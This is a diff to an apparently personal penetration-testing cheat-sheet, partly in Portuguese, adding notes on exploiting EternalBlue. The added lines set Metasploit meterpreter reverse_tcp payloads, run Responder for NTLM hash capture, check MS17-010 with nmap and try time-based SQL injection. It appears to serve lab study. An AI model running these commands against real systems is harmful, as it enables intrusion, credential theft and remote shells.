@@ -177,6 +177,12 @@ módulo para exploitar o eternalblue:
 exploit/windows/smb/ms17_010_psexec
 exploit/windows/smb/ms17_010_eternalblue
 ```
+**Settins architecture of the payload**
+```
+set PAYLOAD windows/x86/meterpreter/reverse_tcp   # 32 bits
+set PAYLOAD windows/x64/meterpreter/reverse_tcp   # 64 bits
+
+```
 
 estabelece conexão passando usuário e senha
 ```
@@ -846,6 +852,7 @@ pth-winexe -U bernardo%HASH //HOST cmd.exe
 
 ```
 responder -I <interface> -Pbv
+responder -I tun0 -Pbv
 ```
 
 ntlmv2 (hashcat 5600 e john netntlmv2)
@@ -975,11 +982,14 @@ whoami /all
 arquivo de configuração
 ```
 /etc/responder/Responder.conf
+
+# acrescentar o IP alvo
+RespondTo = 172.16.1.145
 ```
 obs: altera a linha respondTo para incluir apenas os nossos hosts alvo
 
 ```
-responder -I eth0 -Prv
+responder -I eth0 -Pv
 ```
 
 ## Remote Desktop Protocol (rdp port 3389)
@@ -1451,6 +1461,37 @@ searchsploit ipfire --id -m <exploit_ID>
 
 # web
 
+
+## nmap
+
+**path to scripts**
+```
+/usr/share/nmap/scripts
+
+```
+
+**checking if the host are vulnerable to eternalblue (CVE-2017-0143)**
+```
+nmap -script=smb-vuln-ms17-010.nse -sV -Pn 172.16.1.145 -p 445                   
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds
+```
 ## reverse shell
 ```
 # exemplo 1
@@ -1610,6 +1651,7 @@ describe <table_name>;
 wordlist com payloads para sql injection
 ```
 /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
+https://github.com/payloadbox/sql-injection-payload-list
 ```
 
 **error based** 
@@ -1660,12 +1702,27 @@ GET /produtos.php?mprod=0&cat==26 AND (SELECT 111111111111111234 FROM (SELECT(SL
 SELECT 11111111111111118818 FROM (SELECT(SLEEP(3)))string_qualquer_aqui;
 
 
+```
+obs: No exemplo 1, apenas o parametro `cat` era vulnerável à sql injection
+
+```
+select * from usuarios;
++----+---------+-----------+
+| id | nome    | senha     |
++----+---------+-----------+
+|  1 | alice   | senha123  |
+|  2 | bob     | 1234senha |
+|  3 | charlie | passw0rd  |
++----+---------+-----------+
+3 rows in set (0.000 sec)
 
 
+MariaDB [teste]> select * from usuarios where id = sleep(5);
+Empty set (15.020 sec)
 
 
 ```
-obs: No exemplo 1, apenas o parametro `cat` era vulnerável à sql injection
+
 #### sqlmap
 **descobrindo sql injection**
 ```
